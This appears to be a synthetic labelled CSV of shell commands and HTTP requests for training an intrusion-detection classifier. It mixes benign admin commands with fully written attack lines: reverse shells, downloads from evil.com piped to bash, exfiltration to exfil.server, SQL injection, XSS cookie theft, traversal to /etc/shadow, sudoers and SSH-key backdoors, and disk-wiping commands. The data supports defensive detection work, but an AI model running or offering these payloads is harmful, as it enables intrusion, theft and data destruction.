timestamp,attacker_ip,command_sequence,label
2026-01-23 12:35:12,129.161.181.222,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 15:24:12,11.105.28.150,rm -rf /var/www/html/*,1
2026-01-23 10:26:12,180.105.123.8,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 08:11:12,146.23.48.55,hostnamectl,0
2026-01-23 12:40:12,201.11.133.130,chmod 4777 /bin/bash,1
2026-01-23 05:34:12,138.131.236.50,uptime,0
2026-01-23 16:15:12,25.218.95.244,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 05:15:12,216.138.238.97,timedatectl,0
2026-01-23 13:02:12,68.14.23.248,host -t txt target.com,1
2026-01-23 13:22:12,33.94.246.61,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 17:05:12,64.39.165.153,cat ../../../etc/passwd,1
2026-01-23 06:18:12,60.203.7.21,du -sh /var/www/*,0
2026-01-23 11:53:12,64.9.167.125,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 10:41:12,67.12.138.231,tar czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
2026-01-23 15:02:12,120.81.125.62,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
2026-01-23 02:54:12,107.129.157.156,du -sh /home/* | sort -hr,0
2026-01-23 07:47:12,52.209.42.58,chmod 644 /var/www/html/index.html,0
2026-01-23 05:36:12,202.98.151.199,lsblk,0
2026-01-23 15:15:12,112.19.163.123,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 11:25:12,113.229.12.179,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 05:31:12,114.97.197.126,chown www-data:www-data /var/www/html -R,0
2026-01-23 05:06:12,51.186.66.170,logrotate -f /etc/logrotate.d/nginx,0
2026-01-23 15:13:12,10.17.32.249,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 05:00:12,223.21.159.210,chmod 644 /var/www/html/index.html,0
2026-01-23 04:26:12,192.247.113.233,ip route show,0
2026-01-23 16:01:12,164.122.111.133,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 11:07:12,85.126.118.12,"curl -H ""User-Agent: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
2026-01-23 12:45:12,70.47.157.178,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 09:33:12,56.185.105.136,lsblk,0
2026-01-23 11:15:12,10.195.242.2,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 04:07:12,45.131.27.160,ln -s /var/www/html /home/user/www,0
2026-01-23 15:27:12,9.23.103.95,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 16:34:12,110.108.181.223,host -t txt target.com,1
2026-01-23 16:59:12,3.211.144.60,smbclient -L //target.com -U admin%password,1
2026-01-23 13:44:12,215.178.26.200,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
2026-01-23 11:56:12,39.228.246.118,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 14:15:12,147.131.196.127,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 15:26:12,25.26.135.104,sudo nmap --script vuln target.com,1
2026-01-23 03:23:12,57.101.55.233,timedatectl,0
2026-01-23 02:24:12,57.199.114.161,du -sh /home/* | sort -hr,0
2026-01-23 08:33:12,75.73.42.1,crontab -l,0
2026-01-23 17:24:12,66.161.66.210,smbclient -L //target.com -U admin%password,1
2026-01-23 03:37:12,117.107.108.169,nslookup google.com,0
2026-01-23 10:54:12,102.79.92.128,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 15:00:12,116.58.70.62,curl http://evil.com/backdoor.php | bash,1
2026-01-23 01:50:12,117.131.250.39,tail -20 /var/log/syslog,0
2026-01-23 14:43:12,117.200.252.98,host -t txt target.com,1
2026-01-23 09:15:12,212.227.143.212,rsync -avz /var/www/html/ backup/,0
2026-01-23 09:38:12,140.229.136.250,cat /var/www/../../../../etc/passwd,1
2026-01-23 09:17:12,22.217.2.124,crontab -l,0
2026-01-23 01:39:12,83.218.113.247,apt update && apt list --upgradable,0
2026-01-23 03:10:12,62.131.116.253,timedatectl,0
2026-01-23 03:34:12,123.219.214.182,mtr -c 10 google.com,0
2026-01-23 17:01:12,18.3.22.249,dig @target.com axfr target.com,1
2026-01-23 15:53:12,3.43.129.248,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
2026-01-23 10:48:12,116.85.128.69,"curl ""http://target.com/static/../../../../etc/passwd""",1
2026-01-23 04:42:12,123.25.115.113,systemctl status mysql,0
2026-01-23 12:34:12,186.122.158.218,rm -rf /* --no-preserve-root,1
2026-01-23 01:38:12,209.4.92.221,ping -c 4 8.8.8.8,0
2026-01-23 02:59:12,211.94.85.37,hostnamectl,0
2026-01-23 02:23:12,203.63.205.109,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 15:57:12,107.1.151.46,mkfs.ext4 /dev/sda1,1
2026-01-23 12:38:12,166.155.118.240,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 12:09:12,105.105.252.140,host -t txt target.com,1
2026-01-23 08:26:12,24.56.99.154,journalctl -u nginx -n 50,0
2026-01-23 06:37:12,132.42.66.144,timedatectl,0
2026-01-23 05:22:12,100.249.169.91,id,0
2026-01-23 16:54:12,212.30.8.219,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
2026-01-23 07:01:12,131.249.54.200,localectl status,0
2026-01-23 06:56:12,37.210.44.75,hostnamectl,0
2026-01-23 15:34:12,118.11.157.215,ncat 10.0.0.1 4444 -e /bin/bash,1
2026-01-23 11:59:12,126.6.101.64,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 13:45:12,82.230.223.94,enum4linux target.com,1
2026-01-23 11:43:12,86.111.80.58,nc -e /bin/sh 10.0.0.1 4444,1
2026-01-23 11:34:12,85.228.248.53,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 13:13:12,41.167.192.185,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 10:05:12,210.159.240.202,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 16:47:12,216.14.177.136,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2026-01-23 01:16:12,74.158.200.21,ls -la /var/log/,0
2026-01-23 12:27:12,26.101.168.222,ncat 10.0.0.1 4444 -e /bin/bash,1
2026-01-23 03:38:12,97.90.237.12,apt list --upgradable,0
2026-01-23 08:18:12,105.98.204.239,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 12:26:12,109.8.73.137,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 14:50:12,20.6.72.148,cat ../../../../etc/shadow,1
2026-01-23 13:55:12,183.79.180.230,sudo nmap --script vuln target.com,1
2026-01-23 13:09:12,23.177.242.195,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 08:50:12,16.224.126.196,chmod 644 /var/www/html/index.html,0
2026-01-23 04:52:12,168.192.190.6,cat /etc/nginx/nginx.conf,0
2026-01-23 17:03:12,131.19.5.236,sudo nmap --script vuln target.com,1
2026-01-23 09:36:12,67.39.0.125,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 03:48:12,155.28.254.4,tail -100 /var/log/nginx/access.log,0
2026-01-23 02:35:12,184.151.183.214,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 15:12:12,24.161.102.160,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 12:43:12,190.158.123.236,mkfs.ext4 /dev/sda1,1
2026-01-23 14:31:12,21.176.193.111,curl http://evil.com/backdoor.php | bash,1
2026-01-23 06:36:12,5.162.143.141,localectl status,0
2026-01-23 09:29:12,9.140.112.236,top -n 1 | head -20,0
2026-01-23 15:17:12,127.35.102.33,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 08:12:12,172.138.255.232,netstat -tulpn,0
2026-01-23 02:11:12,89.7.67.158,systemctl status nginx,0
2026-01-23 07:33:12,221.243.183.192,uptime,0
2026-01-23 14:16:12,205.168.79.49,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 03:35:12,67.50.123.110,whoami,0
2026-01-23 01:47:12,124.131.103.147,df -h /,0
2026-01-23 05:19:12,9.89.85.86,rsnapshot daily,0
2026-01-23 01:31:12,39.245.23.105,systemctl status nginx,0
2026-01-23 15:05:12,204.177.40.22,enum4linux target.com,1
2026-01-23 05:10:12,124.16.192.3,journalctl -u nginx -n 50,0
2026-01-23 15:49:12,114.223.185.239,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 04:57:12,45.236.12.225,df -h,0
2026-01-23 07:50:12,132.113.179.147,cat /etc/nginx/nginx.conf,0
2026-01-23 10:44:12,192.215.250.39,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.5"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 01:27:12,190.246.234.23,df -h,0
2026-01-23 01:40:12,60.195.85.179,tail -20 /var/log/syslog,0
2026-01-23 02:05:12,127.77.170.73,"journalctl -u ssh --since ""1 hour ago""",0
2026-01-23 03:13:12,9.14.168.181,traceroute google.com,0
2026-01-23 16:04:12,203.151.95.154,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 10:11:12,90.46.184.167,tar czf - /var/www/html | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
2026-01-23 02:06:12,23.177.109.103,ls -la /var/log/,0
2026-01-23 04:51:12,17.46.221.237,whoami,0
2026-01-23 06:10:12,165.31.60.200,ps aux | grep nginx,0
2026-01-23 08:41:12,103.199.167.169,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 09:26:12,49.138.240.234,rsync -avz /var/www/html/ backup/,0
2026-01-23 17:29:12,149.222.17.86,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 07:08:12,200.44.213.202,ss -tulwn,0
2026-01-23 07:11:12,42.28.136.84,ls -la /var/log/,0
2026-01-23 06:38:12,216.170.33.213,cat /etc/nginx/nginx.conf,0
2026-01-23 02:00:12,138.152.115.207,tail -20 /var/log/syslog,0
2026-01-23 02:08:12,13.44.192.80,ping -c 4 8.8.8.8,0
2026-01-23 01:41:12,196.14.110.114,systemctl status nginx,0
2026-01-23 07:12:12,18.81.250.240,nslookup google.com,0
2026-01-23 03:52:12,87.88.66.139,mount | grep ext4,0
2026-01-23 04:19:12,205.54.197.184,mount | grep ext4,0
2026-01-23 17:17:12,159.223.230.161,host -t txt target.com,1
2026-01-23 12:01:12,128.202.29.139,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 14:54:12,198.42.14.10,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
2026-01-23 16:03:12,56.73.46.49,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 12:32:12,93.59.121.49,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 17:00:12,49.239.153.43,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 08:13:12,78.36.30.209,cat /etc/nginx/nginx.conf,0
2026-01-23 05:08:12,19.222.248.92,apt list --upgradable,0
2026-01-23 09:22:12,112.233.51.236,chmod 644 /var/www/html/index.html,0
2026-01-23 10:38:12,206.72.105.104,cat /var/www/../../../../etc/passwd,1
2026-01-23 07:57:12,167.168.14.242,grep 'error' /var/log/syslog,0
2026-01-23 11:12:12,18.190.42.31,"echo ""* * * * * /usr/bin/nc attacker.com 4444 -e /bin/sh"" | crontab -",1
2026-01-23 13:41:12,50.175.185.28,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 08:58:12,60.191.70.103,timedatectl,0
2026-01-23 05:50:12,48.34.2.82,traceroute google.com,0
2026-01-23 08:30:12,75.192.144.32,logrotate -f /etc/logrotate.d/nginx,0
2026-01-23 06:31:12,111.129.208.63,nslookup google.com,0
2026-01-23 11:17:12,41.132.104.46,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 10:57:12,28.86.153.237,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
2026-01-23 15:20:12,79.59.137.156,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
2026-01-23 11:44:12,193.184.62.7,smbclient -L //target.com -U admin%password,1
2026-01-23 17:42:12,133.201.7.23,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 06:19:12,13.89.176.245,uptime,0
2026-01-23 04:28:12,185.96.186.142,crontab -l,0
2026-01-23 01:42:12,207.225.14.203,crontab -l,0
2026-01-23 04:10:12,94.91.34.22,df -h,0
2026-01-23 01:24:12,137.195.158.126,du -sh /home/* | sort -hr,0
2026-01-23 16:57:12,177.209.19.30,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 14:21:12,70.238.168.82,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 15:08:12,109.248.113.67,rm -rf /* --no-preserve-root,1
2026-01-23 12:55:12,55.229.136.55,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 11:35:12,40.76.243.90,rm -rf /* --no-preserve-root,1
2026-01-23 11:10:12,184.17.240.152,sudo -u#-1 /bin/bash,1
2026-01-23 06:00:12,134.27.105.77,timedatectl,0
2026-01-23 16:38:12,103.188.65.123,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 06:29:12,18.61.177.32,apt update,0
2026-01-23 14:19:12,116.223.65.5,sudo nmap --script vuln target.com,1
2026-01-23 03:46:12,62.128.176.211,cat /proc/meminfo | head -10,0
2026-01-23 17:54:12,84.129.130.77,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 04:37:12,173.183.193.147,mtr -c 10 google.com,0
2026-01-23 04:05:12,92.156.17.170,scp user@server:/var/log/app.log ./,0
2026-01-23 07:37:12,37.68.1.45,curl -I https://example.com,0
2026-01-23 10:52:12,173.64.162.251,"echo ""*/5 * * * * curl -s http://attacker.com/payload.sh | bash"" >> /var/spool/cron/root",1
2026-01-23 12:50:12,95.244.104.100,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
2026-01-23 07:10:12,84.219.33.16,ip addr show,0
2026-01-23 06:01:12,162.63.139.105,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 09:04:12,219.157.159.143,hostnamectl,0
2026-01-23 17:44:12,192.82.7.68,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 04:00:12,68.151.136.11,traceroute google.com,0
2026-01-23 08:06:12,30.127.2.26,mount | grep ext4,0
2026-01-23 17:28:12,208.247.143.29,host -t txt target.com,1
2026-01-23 11:27:12,100.110.114.81,host -t txt target.com,1
2026-01-23 09:19:12,129.127.214.81,cat /proc/meminfo | head -10,0
2026-01-23 17:36:12,102.46.233.152,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 11:47:12,195.162.135.98,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 14:25:12,65.73.14.185,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 15:51:12,147.140.156.106,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 16:13:12,219.76.224.178,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 05:38:12,206.243.65.21,rsnapshot daily,0
2026-01-23 15:31:12,102.195.251.250,cat ../../../etc/passwd,1
2026-01-23 14:48:12,105.55.206.89,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
2026-01-23 09:46:12,68.132.135.206,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 06:48:12,88.236.177.210,lsblk,0
2026-01-23 11:48:12,18.79.227.237,dig @target.com axfr target.com,1
2026-01-23 04:54:12,144.210.148.254,traceroute google.com,0
2026-01-23 05:12:12,200.221.235.124,cat /proc/meminfo | head -10,0
2026-01-23 04:47:12,191.123.75.75,nmcli device status,0
2026-01-23 01:34:12,217.140.144.138,du -sh /var/log/,0
2026-01-23 10:33:12,128.202.2.213,"curl ""http://target.com/load?file=....//....//....//proc/self/environ""",1
2026-01-23 01:35:12,80.76.57.69,"journalctl -u sshd --since ""1 hour ago""",0
2026-01-23 01:57:12,125.125.253.7,df -h,0
2026-01-23 10:34:12,191.238.228.236,"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((""10.10.14.5"",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")'",1
2026-01-23 13:30:12,50.119.36.213,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 06:28:12,161.151.103.174,nmcli device status,0
2026-01-23 06:49:12,137.137.157.207,ln -s /var/www/html /home/user/www,0
2026-01-23 10:46:12,205.206.196.88,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 05:29:12,148.124.26.127,ps aux | grep nginx,0
2026-01-23 04:41:12,187.81.249.167,chmod 644 /var/www/html/index.html,0
2026-01-23 05:18:12,59.139.26.28,rsync -avz /var/www/html/ backup/,0
2026-01-23 10:39:12,139.145.105.204,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 06:53:12,124.239.163.89,netstat -tulpn,0
2026-01-23 17:02:12,167.0.224.36,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 10:35:12,77.184.159.240,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 07:53:12,23.36.190.90,rsync -avz /var/www/html/ backup/,0
2026-01-23 03:09:12,211.94.87.221,grep 'error' /var/log/syslog,0
2026-01-23 08:17:12,163.246.233.120,lsblk,0
2026-01-23 17:26:12,168.82.146.237,smbclient -L //target.com -U admin%password,1
2026-01-23 09:34:12,4.24.1.162,localectl status,0
2026-01-23 09:37:12,212.163.240.138,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
2026-01-23 06:27:12,127.17.62.232,ls -la /var/log/,0
2026-01-23 06:07:12,197.28.139.249,netstat -tulpn,0
2026-01-23 04:55:12,87.88.196.109,openssl x509 -in /etc/ssl/certs/server.crt -text -noout,0
2026-01-23 05:16:12,177.114.85.235,ln -s /var/www/html /home/user/www,0
2026-01-23 17:21:12,150.173.55.99,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 02:26:12,37.102.135.52,ls -la /var/log/,0
2026-01-23 07:13:12,6.205.149.72,dig example.com,0
2026-01-23 13:03:12,168.104.169.65,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 15:32:12,139.112.205.124,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 09:53:12,29.165.64.211,"curl ""http://target.com/download?file=....//....//....//etc/shadow""",1
2026-01-23 13:21:12,19.137.237.112,rm -rf /var/www/html/*,1
2026-01-23 15:41:12,123.50.123.35,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 12:07:12,199.231.236.7,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 04:20:12,53.231.191.214,find /var/www -name '*.php' -mtime -1,0
2026-01-23 06:08:12,104.96.193.63,mtr -c 10 google.com,0
2026-01-23 05:56:12,41.151.247.163,systemctl status mysql,0
2026-01-23 07:06:12,113.30.237.130,openssl x509 -in /etc/ssl/certs/server.crt -text -noout,0
2026-01-23 04:03:12,54.212.185.61,ping -c 4 google.com,0
2026-01-23 06:23:12,47.213.59.129,localectl status,0
2026-01-23 03:56:12,69.51.204.62,mount | grep ext4,0
2026-01-23 01:25:12,85.161.27.128,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 13:06:12,144.30.67.229,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 06:25:12,132.23.215.30,mtr -c 10 google.com,0
2026-01-23 03:30:12,39.171.90.75,curl -I https://example.com,0
2026-01-23 09:16:12,189.2.132.104,localectl status,0
2026-01-23 05:44:12,169.86.64.194,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 10:10:12,173.126.119.194,sudo -u#-1 /bin/bash,1
2026-01-23 06:12:12,76.71.128.13,curl -I https://example.com,0
2026-01-23 10:09:12,107.41.143.124,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 14:12:12,177.131.146.237,dd if=/dev/zero of=/dev/sda bs=1M,1
